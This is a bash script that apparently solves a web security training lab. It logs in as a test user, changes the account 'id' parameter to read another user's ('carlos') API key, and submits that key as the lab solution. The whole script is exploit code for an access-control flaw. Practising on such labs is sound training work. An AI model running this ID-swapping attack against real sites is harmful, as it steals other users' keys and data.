#!/bin/bash

login() {
    echo "(+) Logging is as user Wiener..."
    login_page="${url}/login"
    credentials="username=wiener&password=peter"
    export cookie=$(curl -s -o /dev/null -c - "$login_page" -d "$credentials" | awk '/session/ {print $NF}')
    account="${url}/my-account?id=wiener"
    response=$(curl -s -o /dev/null "$account" -w "%{http_code}")
    if [[ "${response}" == 200 ]]; then
        echo "(+) Logged in successfully!"
    else
        echo "(+) Failed to log in"
        echo "(+) Exiting..."
        exit 1
    fi
}

get_key() {
    echo "(+) Getting Carlos's API key..."
    carlos_account="${url}/my-account?id=carlos"
    key=$(curl -s "$carlos_account" -b "session="${cookie}"" | grep 'API' | cut -d ':' -f 2 | cut -d '<' -f 1 | xargs) #| awk -F '</?div>' '/Your API Key is:/ {print $2}' | awk '{print $NF}')
    echo "(+) Successfylly got the API key -> ${key}"
    echo "(+) Submitting the API key..."
    response=$(curl -s -o /dev/null -w "%{http_code}" -d "answer=${key}" "${url}/submitSolution" -b "session=${cookie}")
    if [[ "${response}" -eq 200 ]]; then
        echo "(+) Successfully completed the Lab!"
    else
        echo "(+) Something went wrong!"
        echo "(+) Exiting..."
        exit 1
    fi
}   

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url=$1
    login "$url"
    get_key "$url"
}
main "$@"